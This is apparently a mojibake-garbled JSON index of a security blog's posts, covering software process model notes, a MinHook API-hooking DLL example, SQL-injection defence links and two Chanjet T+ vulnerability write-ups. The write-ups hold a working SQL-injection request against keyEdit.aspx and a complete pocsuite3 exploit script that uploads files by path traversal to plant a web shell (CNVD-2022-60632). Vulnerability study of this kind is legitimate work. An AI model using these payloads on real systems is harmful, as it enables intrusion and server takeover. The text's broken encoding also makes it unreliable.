å¢é‡æ¨¡å‹ï¼šå°†éœ€æ±‚åˆ†æ®µä¸ºä¸€ç³»åˆ—å¢é‡äº§å“ï¼Œæ¯ä¸€å¢é‡å¯ä»¥åˆ†åˆ«å¼€å‘ã€‚é‡‡ç”¨éšç€æ—¥ç¨‹æ—¶é—´çš„è¿›å±•è€Œäº¤é”™çš„çº¿æ€§åºåˆ—ï¼Œæ¯ä¸€ä¸ªçº¿æ€§åºåˆ—äº§ç”Ÿè½¯ä»¶çš„ä¸€ä¸ªå¯å‘å¸ƒçš„â€œå¢é‡â€ã€‚ ä¼˜ç‚¹ï¼šç¬¬ä¸€ä¸ªå¯äº¤ä»˜ç‰ˆæœ¬æ‰€éœ€è¦çš„æˆæœ¬å’Œæ—¶é—´å¾ˆå°‘ï¼›å¼€å‘ç”±å¢é‡è¡¨ç¤ºçš„å°ç³»ç»Ÿæ‰€æ‰¿æ‹…çš„é£é™©ä¸å¤§ï¼›å¯ä»¥å‡å°‘ç”¨æˆ·éœ€æ±‚çš„å˜æ›´ï¼›è¿è¡Œå¢é‡æŠ•èµ„ï¼Œå³åœ¨é¡¹ç›®å¼€å§‹æ—¶ï¼Œå¯ä»¥ä»…å¯¹ä¸€ä¸ªæˆ–ä¸¤ä¸ªå¢é‡æŠ•èµ„ã€‚ åŸå‹æ¨¡å‹ï¼šé€‚åˆäºç”¨æˆ·éœ€æ±‚ä¸æ˜ç¡®ã€éœ€æ±‚ç»å¸¸å˜åŒ–çš„æƒ…å†µã€‚ç³»ç»Ÿè§„æ¨¡ä¸æ˜¯å¾ˆå¤§ä¹Ÿä¸å¤æ‚æ—¶ï¼Œé‡‡ç”¨è¯¥æ–¹æ³•æ¯”è¾ƒå¥½ã€‚ èºæ—‹æ¨¡å‹ï¼šå°†ç€‘å¸ƒæ¨¡å‹å’Œè¡Œç»“åˆèµ·æ¥ï¼ŒåŠ å…¥äº†ä¸¤ä¸ªæ¨¡å‹å¿½ç•¥çš„é£é™©åˆ†æã€‚å¼ºè°ƒé£é™©åˆ†æï¼Œé€‚ç”¨äºåºå¤§ã€å¤æ‚å¹¶ä¸”å…·æœ‰é«˜é£é™©çš„ç³»ç»Ÿã€‚éœ€è¦å¼€å‘äººå‘˜å…·æœ‰ç›¸å½“ä¸°å¯Œçš„é£é™©è¯„ä¼°ç»éªŒå’Œä¸“é—¨çŸ¥è¯†ã€‚è¿‡å¤šçš„è¿­ä»£æ¬¡æ•°ä¼šå¢åŠ å¼€å‘æˆæœ¬ï¼Œå»¶è¿Ÿæäº¤æ—¶é—´ã€‚ åˆ¶å®šè®¡åˆ’ é£é™©åˆ†æ å®æ–½å·¥ç¨‹ ç”¨æˆ·è¯„ä¼° å–·æ³‰æ¨¡å‹ï¼šä»¥ç”¨æˆ·éœ€æ±‚ä¸ºåŠ¨åŠ›ï¼Œä»¥å¯¹è±¡ä½œä¸ºé©±åŠ¨ã€‚æ”¯æŒè½¯ä»¶é‡ç”¨å’Œå¤šé¡¹å¼€å‘æ´»åŠ¨é›†æˆï¼Œå…·æœ‰è¿­ä»£è¡Œå’Œæ— é—´éš™æ€§ã€‚ æ•æ·å¼€å‘æ¨¡å‹ æé™ç¼–ç¨‹ï¼ˆXPï¼‰ï¼šç”±ä»·å€¼è§‚ã€åŸåˆ™ã€å®è·µå’Œè¡Œä¸º4ä¸ªéƒ¨åˆ†æ„æˆ 4å¤§ä»·å€¼è§‚ï¼šæ²Ÿé€šã€ç®€å•æ€§ã€åé¦ˆå’Œå‹‡æ°” 5å¤§åŸåˆ™ï¼šå¿«é€Ÿåé¦ˆã€ç®€å•æ€§å‡è®¾ã€é€æ­¥ä¿®æ”¹ã€æå€¡æ›´æ”¹å’Œä¼˜è´¨å·¥ä½œ 12å¤§åŸåˆ™ï¼šè®¡åˆ’æ¸¸æˆã€å°å‹å‘å¸ƒã€éšå–»ã€ç®€å•è®¾è®¡ã€æµ‹è¯•å…ˆè¡Œã€é‡æ„ã€ç»“å¯¹ç¼–ç¨‹ã€é›†ä½“ä»£ç æ‰€æœ‰åˆ¶ã€æŒç»­é›†æˆã€æ¯å‘¨å·¥ä½œ40å°æ—¶ã€ç°åœºå®¢æˆ·å’Œç¼–ç æ ‡å‡† æ°´æ™¶æ³•ï¼šæ¯ä¸€ä¸ªé¡¹ç›®éƒ½éœ€è¦ä¸€å¥—ä¸åŒçš„ç­–ç•¥ã€çº¦å®šå’Œæ–¹æ³•è®º å¹¶åˆ—äº‰æ±‚æ³•ï¼šæ¯30å¤©ä¸€ä¸ªè¿­ä»£æˆ–å†²åˆºï¼Œå¹¶æŒ‰éœ€æ±‚çš„ä¼˜å…ˆçº§åˆ«æ¥å®ç°äº§å“ã€‚ æ•æ·ç»Ÿä¸€è¿‡ç¨‹ï¼ˆAUPï¼‰ï¼šåœ¨å¤§å‹ä¸Šè¿ç»­ï¼Œåœ¨å°å‹ä¸Šè¿­ä»£ ISO\\IECè½¯ä»¶è´¨é‡æ¨¡å‹è§„å®šçš„è´¨é‡ç‰¹æ€§ åŠŸèƒ½æ€§ å¯é æ€§ æ˜“ç”¨æ€§ æ•ˆç‡ ç»´æŠ¤æ€§ å¯ç§»æ¤æ€§ é€‚åˆæ€§å‡†ç¡®æ€§äº’æ“ä½œæ€§åŠŸèƒ½æ€§çš„ä¾ä»æ€§å®‰å…¨ä¿å¯†æ€§ å®¹é”™æ€§æ˜“æ¢å¤æ€§æˆç†Ÿæ€§å¯é æ€§çš„ä¾ä»æ€§ æ˜“å­¦æ€§æ˜“ç†è§£æ€§æ˜“æ“ä½œæ€§æ˜“ç”¨æ€§çš„ä¾ä»æ€§ æ—¶é—´ç‰¹æ€§èµ„æºåˆ©ç”¨ç‰¹æ€§æ•ˆç‡ä¾ä»æ€§ æ˜“æµ‹è¯•æ€§æ˜“æ”¹å˜æ€§ç¨³å®šæ€§æ˜“åˆ†ææ€§ç»´æŠ¤æ€§çš„ä¾ä»æ€§ é€‚åº”æ€§æ˜“å®‰è£…æ€§å…±å­˜æ€§æ˜“æ›¿æ¢æ€§å¯ç§»æ¤æ€§çš„ä¾ä»æ€§ å¯é æ€§ MTTF/(1+MTTF) å¯ç”¨æ€§ MTBF/(1+MTBF) å¯ç»´æŠ¤æ€§ 1/(1+MTTR)","tags":[],"categories":[{"name":"B_ä¹¦ç±èµ„æ–™","slug":"B-ä¹¦ç±èµ„æ–™","permalink":"https://hodlyounger.github.io/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/"},{"name":"è½¯ä»¶è®¾è®¡å¸ˆ","slug":"B-ä¹¦ç±èµ„æ–™/è½¯ä»¶è®¾è®¡å¸ˆ","permalink":"https://hodlyounger.github.io/categories/B-%E4%B9%A6%E7%B1%8D%E8%B5%84%E6%96%99/%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E5%B8%88/"}]},{"title":"ã€OPenSourceã€‘MinHook","date":"2024-05-10T16:00:00.000Z","path":"C_OpenSource/ã€MinHookã€‘Windows ç¼–è¯‘æŒ‡å—/","text":"æ¦‚è¿°ï¼šMinHookâ€”â€”ä¸€ä¸ªminiçš„Hookåº“ã€‚å¦‚ä½•ä½¿ç”¨åŠåŸç†è§£æ MinHook è¯´æ˜ MinHook æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€å®ç°çš„ mini çš„ Hook é¡¹ç›®ï¼Œå¯åŒæ—¶é€‚ç”¨äº x86/x64ç¯å¢ƒä¸‹ï¼Œæ”¯æŒé™æ€ç¼–è¯‘åˆ°é¡¹ç›®ä¸­ï¼Œç›®å‰ â­ Github Start 4Kã€‚ Githubåœ°å€ï¼šTsudaKageyu/minhook: The Minimalistic x86/x64 API Hooking Library for Windows ä½¿ç”¨ å¦‚ä½•ä½¿ç”¨ MinHook ï¼Ÿ ä½¿ç”¨éå¸¸ç®€å•ï¼Œåˆå§‹åŒ–ã€åˆ›å»ºHookã€å¯ç”¨Hookã€‚å¤§è‡´ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š Hook å®ç°ä¿®æ”¹å¼¹çª—: å®ç°Hook MsgBoxå¼¹çª—,è¯¥åº“çš„åŸç†ä¸æˆ‘ä»¬ä¸Šé¢æ‰‹åŠ¨å®ç°çš„æ–¹å¼æ˜¯ç›¸åŒçš„. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* ä»£ç æ¥è‡ª C/C++ MinHook åº“çš„ä½¿ç”¨æŠ€å·§ - lyshark - åšå®¢å›­https://www.cnblogs.com/LyShark/p/13653435.html*/#include &lt;Windows.h&gt;#include &lt;MinHook.h&gt;#pragma comment(lib,&quot;libMinHook.x86.lib&quot;)typedef int (WINAPI *OldMessageBox)(HWND, LPCSTR, LPCSTR, UINT);OldMessageBox fpMessageBoxA = NULL;int WINAPI MyMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)&#123; int ret = fpMessageBoxA(hWnd, &quot;Hook Inject&quot;, lpCaption, uType); return ret;&#125;void SetHook()&#123; if (MH_Initialize() == MB_OK) &#123; MH_CreateHook(&amp;MessageBoxA, &amp;MyMessageBoxA, reinterpret_cast&lt;void**&gt;(&amp;fpMessageBoxA)); MH_EnableHook(&amp;MessageBoxA); &#125;&#125;void UnHook()&#123; if (MH_DisableHook(&amp;MessageBoxA) == MB_OK) &#123; MH_Uninitialize(); &#125;&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: SetHook(); break; case DLL_PROCESS_DETACH: UnHook(); break; &#125; return TRUE;&#125; è¿™é‡Œè¿˜æœ‰å…¶ä»–ä¸€äº›ä¾‹å­ï¼Œå‚è€ƒæ–‡ç« ï¼šC/C++ MinHook åº“çš„ä½¿ç”¨æŠ€å·§ - lyshark - åšå®¢å›­ MinHook åŸç†åˆ†æ å‚è€ƒæ–‡ç« ï¼š MinHook åˆ†æ01 ï¼ˆx86çš„jmp+offsetç±»å‹hookï¼‰ - æ²‰ç–´ - åšå®¢å›­","tags":[{"name":"OpenSource","slug":"OpenSource","permalink":"https://hodlyounger.github.io/tags/OpenSource/"},{"name":"MinHook","slug":"MinHook","permalink":"https://hodlyounger.github.io/tags/MinHook/"}],"categories":[{"name":"C_OpenSource","slug":"C-OpenSource","permalink":"https://hodlyounger.github.io/categories/C-OpenSource/"}]},{"title":"ã€SQLæ³¨å…¥é˜²å¾¡ã€‘","date":"2024-05-09T07:06:57.037Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/SQLæ³¨å…¥/ã€SQLæ³¨å…¥é˜²å¾¡ã€‘index/","text":"æ¦‚è¿°ï¼šç›¸å…³æ–‡ç« æ•´ç†ï¼Œæ€è·¯æ”¶é›† ç›¸å…³æ–‡ç«  ç»¼è¿° åˆå­¦SQLæ³¨å…¥ä¹‹å¸¸è§çš„å‡ ç§æ³¨å…¥ç±»å‹ä»‹ç» - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· é˜²å¾¡ æ·±å…¥ç†è§£SQLæ³¨å…¥ï¼šåŸç†ã€å±å®³ä¸é˜²å¾¡ç­–ç•¥-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ ç›¸å…³é¡¹ç›® sqlæ³¨å…¥é˜²å¾¡â€”â€”libinjectionè¯­ä¹‰è¯†åˆ«åˆ†æ client9/libinjection: SQL / SQLI tokenizer parser analyzer client9/libinjection: SQL / SQLI tokenizer parser analyzer SQLChop - ä¸€ä¸ªæ–°å‹ SQL æ³¨å…¥æ£€æµ‹å¼•æ“ æµ‹è¯•å¹³å° SQLChop Beta","tags":[{"name":"POC/SQLInject","slug":"POC-SQLInject","permalink":"https://hodlyounger.github.io/tags/POC-SQLInject/"},{"name":"SQLInject","slug":"SQLInject","permalink":"https://hodlyounger.github.io/tags/SQLInject/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"SQLæ³¨å…¥","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/SQLæ³¨å…¥","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"ã€1Dayã€‘ç•…æ·é€š keyEdit.aspx SQL æ¼æ´","date":"2024-05-08T02:52:27.440Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/ç•…æ·é€š/ã€1dayã€‘ç•…æ·é€š keyEdit.aspx SQL æ¼æ´/","text":"æ¦‚è¿°ï¼šç•…æ·é€š keyEdit.aspx SQL æ³¨å…¥æ¼æ´è¯¦è§£ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ æ¼æ´è¯´æ˜ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¯·æ±‚å¯¹åº”çš„æ¥å£ keyEdit.aspx æ—¶åœ¨å‚æ•° KeyID æ³¨å…¥ SQL è¯­å¥ï¼Œresponses è¿”å›äº†æŸ¥è¯¢ç»“æœã€‚ POC 1234POST /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&amp;preload=1 HTTP/1.1Host: 192.168.19.133:80User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36Content-Length: 0 æ¼æ´åˆ†æ ç›´æ¥çœ‹è°ƒç”¨å‡½æ•°ï¼Œç®€ç›´ä¸è¦å¤ªæ˜æ˜¾ã€‚KeyID å³è¯·æ±‚ä½“å‚æ•°ä¸­çš„ KeyID å‚æ•°çš„å€¼ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰åšä»»ä½•æ ¡éªŒï¼Œç›´æ¥å’ŒæŸ¥è¯¢ SQL æ‹¼æ¥ã€‚åœ¨è¿™é‡Œå¤§å®¶ä¹Ÿéœ€è¦æ³¨æ„è¿™ç§ SQL è¯­å¥çš„å†™æ³•ï¼Œå¤ªå®¹æ˜“è¢«åˆ©ç”¨ï¼Œè‡³å°‘ä¹Ÿè¦åšå‚æ•°æ ¡éªŒã€‚","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"POC/SQLInject","slug":"POC-SQLInject","permalink":"https://hodlyounger.github.io/tags/POC-SQLInject/"},{"name":"SQLInject","slug":"SQLInject","permalink":"https://hodlyounger.github.io/tags/SQLInject/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"ç•…æ·é€š","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/ç•…æ·é€š","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"ã€CNVD-2022-60632ã€‘ç•…æ·é€šTPlusä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","date":"2024-05-07T16:00:00.000Z","path":"A_å†…åŠŸ/A_POCæ¢ç´¢/ç•…æ·é€š/ã€CNVD-2022-60632ã€‘ç•…æ·é€šTPlusä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´/","text":"æ¦‚è¿°ï¼šCNVD-2022-60632 ç•…æ·é€š T+ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ æ¼æ´è¯´æ˜ æ¼æ´æè¿° 2022å¹´8æœˆ29æ—¥å’Œ8æœˆ30æ—¥ï¼Œç•…æ·é€šå…¬å¸ç´§æ€¥å‘å¸ƒå®‰å…¨è¡¥ä¸ä¿®å¤äº†ç•…æ·é€šT+è½¯ä»¶ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æœªç»èº«ä»½è®¤è¯çš„æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´ï¼Œé€šè¿‡ç»•è¿‡ç³»ç»Ÿé‰´æƒï¼Œåœ¨ç‰¹å®šé…ç½®ç¯å¢ƒä¸‹å®ç°ä»»æ„æ–‡ä»¶çš„ä¸Šä¼ ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ï¼Œè·å¾—æœåŠ¡å™¨æ§åˆ¶æƒé™ã€‚ç›®å‰ï¼Œå·²æœ‰ç”¨æˆ·è¢«ä¸æ³•åˆ†å­åˆ©ç”¨è¯¥æ¼æ´è¿›è¡Œå‹’ç´¢ç—…æ¯’æ”»å‡»çš„æƒ…å†µå‡ºç°ã€‚ CNVDå¯¹è¯¥æ¼æ´çš„ç»¼åˆè¯„çº§ä¸ºâ€œé«˜å±â€ã€‚ å½±å“èŒƒå›´ æ¼æ´å½±å“çš„äº§å“å’Œç‰ˆæœ¬ï¼š ç•…æ·é€šT+å•æœºç‰ˆ&lt;=17.0ä¸”ä½¿ç”¨IIS10.0ä»¥ä¸‹ç‰ˆæœ¬ã€‚ POC POC ä½¿ç”¨äº† pocsuit å·¥å…·ï¼Œpocsuit æ˜¯ä½¿ç”¨ Python ç¼–å†™çš„ä¸€ä¸ªä¸“é—¨ç”¨äº POC ç¼–å†™å¼€å‘ä½¿ç”¨çš„å·¥å…·é›†ã€‚ å¦‚ä½•ä½¿ç”¨ pocsuit å·¥å…·è·‘ poc? ä»¥ä¸‹æ–¹ POC ä»£ç ä¸ºä¾‹ï¼Œè¿è¡Œ POC å‘½ä»¤å¦‚ä¸‹æ‰€ç¤ºï¼š 1pocsuite -r .\\CNVD-2022-60632.py -u http://localhost:80/ --verify æ–‡ä»¶æ¶æ„å¦‚ä¸‹æ‰€ç¤ºï¼š ä¸Šä¼ çš„æ–‡ä»¶ä¸º bin ç›®å½•ä¸‹çš„ dll æ–‡ä»¶å’Œ compiled æ–‡ä»¶ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081from collections import OrderedDictfrom urllib.parse import urljoinimport refrom pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPEfrom pocsuite3.api import OrderedDict, OptStringimport jsonimport osclass ChanJetPOC(POCBase): vulID = &#x27;0&#x27; # ssvid ID å¦‚æœæ˜¯æäº¤æ¼æ´çš„åŒæ—¶æäº¤ PoC,åˆ™å†™æˆ 0 version = &#x27;1&#x27; # é»˜è®¤ä¸º1 author = [&#x27;&#x27;] # PoCä½œè€…çš„å¤§å vulDate = &#x27;2022-09-23&#x27; # æ¼æ´å…¬å¼€çš„æ—¶é—´,ä¸çŸ¥é“å°±å†™ä»Šå¤© createDate = &#x27;2022-09-23&#x27; # ç¼–å†™ PoC çš„æ—¥æœŸ updateDate = &#x27;2022-09-23&#x27; # PoC æ›´æ–°çš„æ—¶é—´,é»˜è®¤å’Œç¼–å†™æ—¶é—´ä¸€æ · references = [&#x27;&#x27;] # æ¼æ´åœ°å€æ¥æº,0dayä¸ç”¨å†™ name = &#x27;ç•…æ·é€šT+ ä»»æ„æ–‡ä»¶ä¸Šä¼ &#x27; # PoC åç§° appPowerLink = &#x27;&#x27; # æ¼æ´å‚å•†ä¸»é¡µåœ°å€ appName = &#x27;ç•…æ·é€šT+&#x27; # æ¼æ´åº”ç”¨åç§° appVersion = &#x27;&#x27;&#x27;ç•…æ·é€šT+å•æœºç‰ˆ&lt;=17.0ä¸”ä½¿ç”¨IIS10.0ä»¥ä¸‹ç‰ˆæœ¬&#x27;&#x27;&#x27; # æ¼æ´å½±å“ç‰ˆæœ¬ vulType = VUL_TYPE.UPLOAD_FILES # æ¼æ´ç±»å‹,ç±»å‹å‚è€ƒè§ æ¼æ´ç±»å‹è§„èŒƒè¡¨ desc = &#x27;&#x27;&#x27; CNVD-2022-60632 ç•…æ·é€šT+ ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ &#x27;&#x27;&#x27; # æ¼æ´ç®€è¦æè¿° samples = [&#x27;&#x27;] # æµ‹è¯•æ ·åˆ—,å°±æ˜¯ç”¨ PoC æµ‹è¯•æˆåŠŸçš„ç½‘ç«™ install_requires = [&#x27;&#x27;] # PoC ç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–ï¼Œè¯·å°½é‡ä¸è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå¿…è¦æ—¶è¯·å‚è€ƒã€ŠPoCç¬¬ä¸‰æ–¹æ¨¡å—ä¾èµ–è¯´æ˜ã€‹å¡«å†™ pocDesc = &#x27;&#x27;&#x27; æ£€æµ‹:pocsuite -r .\\poc++.py -u url(-f url.txt) --verify &#x27;&#x27;&#x27; category = POC_CATEGORY.EXPLOITS.REMOTE def _verify(self): result = &#123;&#125; path = &quot;/tplus/SM/SetupAccount/Upload.aspx?preload=1&quot; headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&#x27;, &#125; url = self.url + path filename = os.listdir(&#x27;bin&#x27;) filename_compiled = filename[0] filename_dll = filename[1] try: files = &#123;&quot;File1&quot;: (&quot;../../../bin/&quot;+filename_compiled+&quot;&quot;,open(&#x27;bin/&#x27;+filename_compiled, &quot;rb&quot;), &quot;image/jpeg&quot;)&#125; resq_0 = requests.post(url=url, headers=headers, files=files, timeout=1000) files = &#123;&quot;File1&quot;: (&quot;../../../bin/&quot;+filename_dll+&quot;&quot;,open(&#x27;bin/&#x27;+filename_dll, &quot;rb&quot;), &quot;image/jpeg&quot;)&#125; resq_1 = requests.post(url=url, headers=headers, files=files, timeout=1000) if resq_0.status_code == 200 and resq_1.status_code == 200: result[&#x27;VerifyInfo&#x27;] = &#123;&#125; result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = url result[&#x27;VerifyInfo&#x27;][&#x27;shell&#x27;] = self.url + &#x27;/tplus/shell.aspx?preload=1&#x27; except Exception as e: print(e) return return self.parse_output(result) def _attack(self): return self._verify() def parse_attack(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return output def _shell(self): return def parse_output(self, result): output = Output(self) if result: output.success(result) else: output.fail(&#x27;target is not vulnerable&#x27;) return outputregister_poc(ChanJetPOC) æ¼æ´åˆ†æ åˆ†æå†…å®¹å‚è€ƒäº†å…¶ä»–ä½œè€…çš„å†…å®¹ï¼Œä»…å­¦ä¹ è®°å½•ï¼Œä¾›å‚è€ƒã€‚ å‰æç¯å¢ƒï¼Œè¯·æ±‚çš„ Params ä¸­ preload è®¾ç½®ä¸º 1 çš„ç›®çš„æ˜¯ä¸ºäº†è·³è¿‡ç™»å½•è®¤è¯ï¼Œè¿™ä¸ªå‚æ•°åœ¨ç•…æ·é€šæœªç™»å½•æƒ…å†µä¸‹ä¸èƒ½å°‘ã€‚ æ¼æ´ä½ç½®ä¸º upload ç›¸å…³æ¥å£ã€‚åœ¨ç•…æ·é€šç¯å¢ƒä¸‹æŸ¥çœ‹ç›¸å…³æ–‡ä»¶ï¼š TPlusStd\\WebSite\\SM\\SetupAccount\\upload.aspxï¼šé¢„ç¼–è¯‘æ–‡ä»¶ï¼Œæ— å®é™…å†…å®¹ï¼ŒæŸ¥çœ‹ç›¸å…³ç¼–è¯‘æ–‡ä»¶ \\TPlusStd\\WebSite\\bin\\upload.aspx.9475d17f.compiledï¼šupload ç›¸å…³é€»è¾‘é¢„ç¼–è¯‘æ–‡ä»¶ï¼ŒæŒ‡æ˜äº†äº§ç‰©åŠç¼–è¯‘æ‰€éœ€çš„æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š æŸ¥çœ‹ç¼–è¯‘äº§ç‰© App_Web_upload.aspx.9475d17f.dllï¼Œé€šè¿‡ dnSpy æŸ¥çœ‹ dll å†…å®¹ã€‚ dnSpy åç¼–è¯‘çš„ Page_Load å‡½æ•°å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Token: 0x06000004 RID: 4 RVA: 0x000020AC File Offset: 0x000002AC protected void Page_Load(object sender, EventArgs e) &#123; this.ReadResources(); if (base.Request.Files.Count == 1) &#123; string text = &quot;images/index.gif&quot;; object obj = this.ViewState[&quot;fileName&quot;]; if (obj != null) &#123; text = obj.ToString(); &#125; if (this.File1.PostedFile.ContentLength &gt; 204800) &#123; base.Response.Write(string.Concat(new string[] &#123; &quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;, this.PhotoTooLarge, &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;, text, &quot;&#x27;;&lt;/script&gt;&quot; &#125;)); return; &#125; if (this.File1.PostedFile.ContentType != &quot;image/jpeg&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/bmp&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/gif&quot; &amp;&amp; this.File1.PostedFile.ContentType != &quot;image/pjpeg&quot;) &#123; base.Response.Write(string.Concat(new string[] &#123; &quot;&lt;script language=&#x27;javascript&#x27;&gt;alert(&#x27;&quot;, this.PhotoTypeError, &quot;&#x27;); parent.document.getElementById(&#x27;myimg&#x27;).src=&#x27;&quot;, text, &quot;&#x27;;&lt;/script&gt;&quot; &#125;)); return; &#125; string fileName = this.File1.PostedFile.FileName; string text2 = fileName.Substring(fileName.LastIndexOf(&#x27;\\\\&#x27;) + 1); this.File1.PostedFile.SaveAs(base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2); string value = base.Server.MapPath(&quot;.&quot;) + &quot;\\\\images\\\\&quot; + text2; this.ViewState[&quot;fileName&quot;] = &quot;images/&quot; + text2; this.Session[&quot;ImageName&quot;] = value; &#125; &#125; 